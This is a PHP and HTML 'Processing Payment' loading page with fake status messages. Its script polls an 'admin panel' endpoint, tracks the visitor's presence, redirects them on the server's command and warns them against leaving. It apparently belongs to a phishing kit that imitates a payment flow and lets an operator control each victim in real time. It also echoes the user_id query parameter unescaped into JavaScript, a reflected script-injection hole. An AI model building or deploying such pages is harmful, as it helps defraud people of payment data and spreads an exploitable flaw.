<?php
$user_id = $_GET['user_id'] ?? '';
if (!$user_id) {
    die('Invalid user ID');
}
?>
<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="google" content="notranslate">
    <title>Processing Payment</title>
    <link rel="shortcut icon" href="assets/imgs/favicon.ico">
    <style>
        /* Keep your existing loading page CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f6f9fc;
            color: #32325d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            margin: 0 auto 24px;
            border: 5px solid #e6ebf1;
            border-top: 5px solid #94a2b3;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .title {
            font-size: 18px;
            font-weight: 600;
            color: #32325d;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #6b7c93;
            line-height: 1.5;
        }
        
        .dots {
            display: inline-block;
            animation: dots 1.5s steps(4, end) infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: "."; }
            40% { content: ".."; }
            60%, 100% { content: "..."; }
        }
        
        .note {
            margin-top: 24px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 6px;
            font-size: 13px;
            color: #6b7c93;
            border-left: 3px solid #94a2b3;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        
        <h1 class="title">Processing your request<span class="dots"></span></h1>
        <p class="subtitle">Please wait while we process your transaction</p>
        
        <div class="note" id="statusNote">
            This may take a few moments. Do not refresh the page.
        </div>
        
        <div id="adminPanelInfo" class="hidden"></div>
    </div>
    
    <script>
        const userID = "<?php echo $user_id; ?>";
        
        // Only 3 text changes that stop at the 3rd message
        const statusMessages = [
            "Processing your request",
            "Verifying payment details", 
            "Finalizing transaction"
        ];
        
        let messageIndex = 0;
        const title = document.querySelector('.title');
        
        // Change message 3 times, then stop
        const messageInterval = setInterval(() => {
            if (messageIndex < statusMessages.length) {
                title.innerHTML = `${statusMessages[messageIndex]}<span class="dots"></span>`;
                messageIndex++;
                
                if (messageIndex >= statusMessages.length) {
                    clearInterval(messageInterval);
                }
            }
        }, 4000);
        
        // Check admin panel every 3 seconds
        async function checkUserStatus() {
            try {
                const response = await fetch(`check.php?user_id=${encodeURIComponent(userID)}&page=loading.php`);
                const data = await response.json();
                
                if (data.shouldRedirect && data.redirectTo) {
                    // Update status before redirect
                    await fetch('track.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            user_id: userID,
                            last_seen: Math.floor(Date.now() / 1000),
                            status: data.status
                        })
                    });
                    
                    window.location.href = data.redirectTo;
                    return true;
                }
                
                // Update last seen time
                await fetch('track.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: userID,
                        last_seen: Math.floor(Date.now() / 1000)
                    })
                });
                
                return false;
            } catch (error) {
                console.log('Status check failed:', error);
                return false;
            }
        }
        
        // Start checking every 3 seconds
        const checkInterval = setInterval(async () => {
            const shouldRedirect = await checkUserStatus();
            if (shouldRedirect) {
                clearInterval(checkInterval);
                clearInterval(messageInterval);
            }
        }, 3000);
        
        // Prevent page refresh/close
        window.addEventListener('beforeunload', (event) => {
            event.preventDefault();
            event.returnValue = 'Your payment is still processing. Are you sure you want to leave?';
        });
        
        // Initial check
        checkUserStatus();
    </script>
</body>
</html>